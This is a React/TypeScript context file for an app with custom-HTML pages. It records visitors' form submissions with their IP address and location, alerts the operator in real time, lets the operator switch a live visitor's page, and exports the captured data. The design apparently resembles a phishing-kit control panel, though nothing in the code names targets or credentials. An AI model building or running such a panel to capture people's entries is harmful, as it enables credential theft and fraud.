import React, { createContext, useContext, useEffect, useRef } from 'react';
import { useSupabaseSessions } from '@/hooks/useSupabaseSession';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { toast } from '@/components/ui/sonner';
import { useQueryClient } from '@tanstack/react-query';

// Page type definitions
interface SubPage {
  id: string;
  name: string;
  description: string;
  fields: string[];
  html: string;
  parentId: string;
}

interface MainPage {
  id: string;
  name: string;
  description: string;
  subPages: SubPage[];
}

interface SessionData {
  timestamp: string;
  ip: string;
  location: string;
  formData: Record<string, string>;
}

interface Session {
  id: string;
  mainPageId: string;
  currentSubPageId: string;
  pageType?: string;
  createdAt: string;
  data: SessionData[];
  active: boolean;
  hasNewData: boolean;
}

interface SessionContextType {
  sessions: any[];
  mainPages: any[];
  addSession: (mainPageId: string, subPageId: string) => void;
  addSessionData: (sessionId: string, data: any) => void;
  switchSubPage: (sessionId: string, newSubPageId: string) => void;
  exportSessionData: (sessionId: string) => void;
  getSessionById: (sessionId: string) => any | undefined;
  getMainPageById: (mainPageId: string) => any | undefined;
  getSubPageById: (mainPageId: string, subPageId: string) => any | undefined;
  closeSession: (sessionId: string) => void;
  resetNewDataFlag: (sessionId: string) => void;
  updateMainPage: (updatedPage: any) => void;
  updateSubPage: (mainPageId: string, updatedSubPage: any) => void;
  addMainPage: (newPage: any) => Promise<string>;
  addSubPage: (mainPageId: string, newSubPage: any) => Promise<string>;
  deleteMainPage: (mainPageId: string) => void;
  deleteSubPage: (mainPageId: string, subPageId: string) => void;
}

const SessionContext = createContext<SessionContextType | undefined>(undefined);

export const useSessionContext = (): SessionContextType => {
  const context = useContext(SessionContext);
  if (!context) {
    throw new Error('useSessionContext must be used within a SessionProvider');
  }
  return context;
};

export const SessionProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const { user } = useAuth();
  const queryClient = useQueryClient();
  const { sessions, mainPages, subPages, createSession, updateSession, closeSession: closeSessionDB } = useSupabaseSessions();
  const channelRef = useRef<any>(null);

  // Set up realtime subscriptions with proper cleanup
  useEffect(() => {
    if (!user) return;

    // Clean up existing channel if it exists
    if (channelRef.current) {
      supabase.removeChannel(channelRef.current);
      channelRef.current = null;
    }

    // Create new channel with unique name
    const channelName = `session-changes-${user.id}-${Date.now()}`;
    const channel = supabase
      .channel(channelName)
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'session_data'
        },
        (payload) => {
          console.log('New session data received:', payload);
          toast("New Data Received", {
            description: `New form submission received for session`,
          });
        }
      );

    // Subscribe and store reference
    channel.subscribe((status) => {
      console.log('Channel subscription status:', status);
    });
    
    channelRef.current = channel;

    return () => {
      if (channelRef.current) {
        supabase.removeChannel(channelRef.current);
        channelRef.current = null;
      }
    };
  }, [user?.id]); // Only depend on user.id to prevent unnecessary re-subscriptions

  // Transform Supabase data to match expected format
  const transformedMainPages = mainPages.map(page => ({
    ...page,
    subPages: subPages.filter(subPage => subPage.main_page_id === page.id).map(subPage => ({
      ...subPage,
      parentId: subPage.main_page_id,
      fields: subPage.fields || []
    }))
  }));

  const transformedSessions = sessions.map(session => ({
    ...session,
    mainPageId: session.main_page_id,
    currentSubPageId: session.current_sub_page_id,
    pageType: session.page_type,
    createdAt: session.created_at,
    hasNewData: session.has_new_data,
    data: []
  }));

  const getMainPageById = (mainPageId: string) => {
    console.log('Looking for main page:', mainPageId, 'in:', transformedMainPages);
    return transformedMainPages.find(page => page.id === mainPageId);
  };

  const getSubPageById = (mainPageId: string, subPageId: string) => {
    console.log('Looking for sub page:', subPageId, 'in main page:', mainPageId);
    const mainPage = getMainPageById(mainPageId);
    const subPage = mainPage?.subPages?.find(subPage => subPage.id === subPageId);
    console.log('Found sub page:', subPage);
    return subPage;
  };

  const getSessionById = (sessionId: string) => {
    return transformedSessions.find(session => session.id === sessionId);
  };

  const addSession = (mainPageId: string, subPageId: string) => {
    console.log('Creating session with:', { mainPageId, subPageId });
    createSession({ mainPageId, subPageId });
  };

  const addSessionData = async (sessionId: string, data: any) => {
    try {
      console.log('Adding session data:', { sessionId, data });
      const { error } = await supabase
        .from('session_data')
        .insert({
          session_id: sessionId,
          timestamp: data.timestamp,
          ip_address: data.ip,
          location: data.location,
          form_data: data.formData
        });

      if (error) throw error;

      await supabase
        .from('sessions')
        .update({ has_new_data: true })
        .eq('id', sessionId);

    } catch (error) {
      console.error('Error adding session data:', error);
    }
  };

  const switchSubPage = (sessionId: string, newSubPageId: string) => {
    console.log('Switching sub page for session:', sessionId, 'to:', newSubPageId);
    updateSession({ 
      sessionId, 
      updates: { 
        current_sub_page_id: newSubPageId,
        updated_at: new Date().toISOString()
      } 
    });
  };

  const resetNewDataFlag = (sessionId: string) => {
    updateSession({ 
      sessionId, 
      updates: { has_new_data: false } 
    });
  };

  const closeSession = (sessionId: string) => {
    closeSessionDB(sessionId);
  };

  const exportSessionData = async (sessionId: string) => {
    try {
      const { data, error } = await supabase
        .from('session_data')
        .select('*')
        .eq('session_id', sessionId)
        .order('timestamp', { ascending: false });

      if (error) throw error;

      const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
        JSON.stringify(data, null, 2)
      )}`;
      const downloadAnchorNode = document.createElement('a');
      downloadAnchorNode.setAttribute('href', dataStr);
      downloadAnchorNode.setAttribute('download', `session_${sessionId}_data.json`);
      document.body.appendChild(downloadAnchorNode);
      downloadAnchorNode.click();
      downloadAnchorNode.remove();
    } catch (error) {
      console.error('Error exporting session data:', error);
    }
  };

  // Updated implementations for admin features
  const updateMainPage = async (updatedPage: any) => {
    try {
      console.log('Updating main page:', updatedPage);
      const { error } = await supabase
        .from('main_pages')
        .update({
          name: updatedPage.name,
          description: updatedPage.description,
          updated_at: new Date().toISOString()
        })
        .eq('id', updatedPage.id);

      if (error) throw error;
      
      // Refresh queries
      queryClient.invalidateQueries({ queryKey: ['main_pages'] });
      
      toast.success("Main page updated successfully");
    } catch (error) {
      console.error('Error updating main page:', error);
      toast.error("Failed to update main page");
      throw error;
    }
  };

  const updateSubPage = async (mainPageId: string, updatedSubPage: any) => {
    try {
      console.log('Updating sub page:', updatedSubPage);
      const { error } = await supabase
        .from('sub_pages')
        .update({
          name: updatedSubPage.name,
          description: updatedSubPage.description,
          html: updatedSubPage.html || '',
          css: updatedSubPage.css || '',
          javascript: updatedSubPage.javascript || '',
          fields: updatedSubPage.fields || [],
          updated_at: new Date().toISOString()
        })
        .eq('id', updatedSubPage.id);

      if (error) throw error;
      
      // Refresh queries
      queryClient.invalidateQueries({ queryKey: ['sub_pages'] });
      
      toast.success("Sub page updated successfully");
    } catch (error) {
      console.error('Error updating sub page:', error);
      toast.error("Failed to update sub page");
      throw error;
    }
  };

  const addMainPage = async (newPage: any): Promise<string> => {
    try {
      console.log('Adding main page:', newPage);
      const newPageId = `page_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
      const { error } = await supabase
        .from('main_pages')
        .insert({
          id: newPageId,
          name: newPage.name,
          description: newPage.description,
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        });

      if (error) {
        console.error('Error inserting main page:', error);
        toast.error("Failed to create main page");
        throw error;
      }
      
      // Refresh queries
      queryClient.invalidateQueries({ queryKey: ['main_pages'] });
      
      toast.success("Main page created successfully");
      return newPageId;
    } catch (error) {
      console.error('Error adding main page:', error);
      throw error;
    }
  };

  const addSubPage = async (mainPageId: string, newSubPage: any): Promise<string> => {
    try {
      console.log('Adding sub page:', newSubPage, 'to main page:', mainPageId);
      const newSubPageId = `subpage_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
      const { error } = await supabase
        .from('sub_pages')
        .insert({
          id: newSubPageId,
          main_page_id: mainPageId,
          name: newSubPage.name,
          description: newSubPage.description,
          html: newSubPage.html || '',
          css: newSubPage.css || '',
          javascript: newSubPage.javascript || '',
          fields: newSubPage.fields || [],
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        });

      if (error) {
        console.error('Error inserting sub page:', error);
        toast.error("Failed to create sub page");
        throw error;
      }
      
      // Refresh queries
      queryClient.invalidateQueries({ queryKey: ['sub_pages'] });
      
      toast.success("Sub page created successfully");
      return newSubPageId;
    } catch (error) {
      console.error('Error adding sub page:', error);
      throw error;
    }
  };

  const deleteMainPage = async (mainPageId: string) => {
    try {
      console.log('Deleting main page:', mainPageId);
      
      // First delete all sub pages
      const { error: subPageError } = await supabase
        .from('sub_pages')
        .delete()
        .eq('main_page_id', mainPageId);

      if (subPageError) throw subPageError;

      // Then delete the main page
      const { error } = await supabase
        .from('main_pages')
        .delete()
        .eq('id', mainPageId);

      if (error) throw error;
      
      // Refresh queries
      queryClient.invalidateQueries({ queryKey: ['main_pages'] });
      queryClient.invalidateQueries({ queryKey: ['sub_pages'] });
      
      toast.success("Main page deleted successfully");
    } catch (error) {
      console.error('Error deleting main page:', error);
      toast.error("Failed to delete main page");
      throw error;
    }
  };

  const deleteSubPage = async (mainPageId: string, subPageId: string) => {
    try {
      console.log('Deleting sub page:', subPageId);
      const { error } = await supabase
        .from('sub_pages')
        .delete()
        .eq('id', subPageId);

      if (error) throw error;
      
      // Refresh queries
      queryClient.invalidateQueries({ queryKey: ['sub_pages'] });
      
      toast.success("Sub page deleted successfully");
    } catch (error) {
      console.error('Error deleting sub page:', error);
      toast.error("Failed to delete sub page");
      throw error;
    }
  };

  return (
    <SessionContext.Provider
      value={{
        sessions: transformedSessions,
        mainPages: transformedMainPages,
        addSession,
        addSessionData,
        switchSubPage,
        exportSessionData,
        getSessionById,
        getMainPageById,
        getSubPageById,
        closeSession,
        resetNewDataFlag,
        updateMainPage,
        updateSubPage,
        addMainPage,
        addSubPage,
        deleteMainPage,
        deleteSubPage
      }}
    >
      {children}
    </SessionContext.Provider>
  );
};
